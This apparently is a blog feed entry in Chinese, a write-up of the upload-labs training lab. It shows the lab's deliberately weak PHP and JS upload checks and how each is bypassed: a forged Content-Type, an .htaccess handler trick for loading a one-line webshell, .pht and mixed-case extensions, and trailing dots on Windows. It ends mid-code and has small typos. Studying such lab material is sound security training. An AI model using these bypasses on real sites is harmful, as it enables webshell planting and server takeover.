<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lhaihai&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.Lhaihai.wang/"/>
  <updated>2018-07-04T10:59:07.605Z</updated>
  <id>http://blog.Lhaihai.wang/</id>
  
  <author>
    <name>Lhaihai</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>upload-labs</title>
    <link href="http://blog.Lhaihai.wang/2018/07/04/upload-labs/"/>
    <id>http://blog.Lhaihai.wang/2018/07/04/upload-labs/</id>
    <published>2018-07-04T10:46:56.000Z</published>
    <updated>2018-07-04T10:59:07.605Z</updated>
    
    <content type="html"><![CDATA[<p>c0ny1师傅写的upload-labs，受益良多</p><a id="more"></a><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0writeup.assets/mind-map.png" alt="img"> </p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0writeup.assets/sum_up.png" alt=""> </p><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass"><a href="#pass" class="headerlink" title="pass"></a>pass</h4><p>禁用JS代码，</p><p>firefox插件： NoScript</p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>move_uploaded_file — 将上传的文件移动到新位置 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool move_uploaded_file ( string $filename , string $destination )</span><br></pre></td></tr></table></figure><p>本函数检查并确保由 <code>filename</code> 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由<code>destination</code> 指定的文件。</p><p>这种检查显得格外重要，如果上传的文件有可能会造成对用户或本系统的其他用户显示其内容的话。</p><h4 id="pass-1"><a href="#pass-1" class="headerlink" title="pass"></a>pass</h4><p>验证Content-Type：</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0writeup.assets/1530596607345.png" alt="1530596607345"></p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR. <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                 $img_path = $UPLOAD_ADDR .<span class="string">'/'</span>. $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strrchr() 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。 </p><p>在线运行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_name=<span class="string">'15.png::$DATA'</span>;</span><br><span class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line"><span class="keyword">echo</span> $file_ext;</span><br><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="keyword">echo</span> $file_ext;</span><br><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="keyword">echo</span> $file_ext;</span><br><span class="line">$file_ext = trim($file_ext);</span><br><span class="line"><span class="keyword">echo</span> $file_ext;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.png::$DATA</span><br><span class="line">.png::$data</span><br><span class="line">.png</span><br><span class="line">.png</span><br></pre></td></tr></table></figure><h4 id="pass-2"><a href="#pass-2" class="headerlink" title="pass"></a>pass</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"cimer"</span>&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd一php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>通过.htaccess文件，调用php的解析器解析一个文件名只要包含“cimer”这个字符串的任意文件。这个“cimer”的内容如果是一句话木马.即可利用中国莱刀进行连接。 </p><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-3"><a href="#pass-3" class="headerlink" title="pass"></a>pass</h4><p>pht后缀</p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-4"><a href="#pass-4" class="headerlink" title="pass"></a>pass</h4><p>pht</p><p>没有对文件名进行小写转换，所以大小写混合或者大写可以绕过 </p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-5"><a href="#pass-5" class="headerlink" title="pass"></a>pass</h4><p>审计代码发现没有去处空格</p><p>利用Windows系统的文件名特性。文件名最后增加<strong>点和空格</strong>，写成<code>06.php.</code>，上传后保存在Windows系统上的文件名最后的一个<code>.</code>会被去掉，实际上保存的文件名就是<code>06.php</code> </p><p>pht</p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-6"><a href="#pass-6" class="headerlink" title="pass"></a>pass</h4><p>审计代码发现没有删除结尾的<code>.</code></p><p>原理同Pass-07</p><p>文件名后加点，改成<code>07.php.</code></p><p>pht</p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span 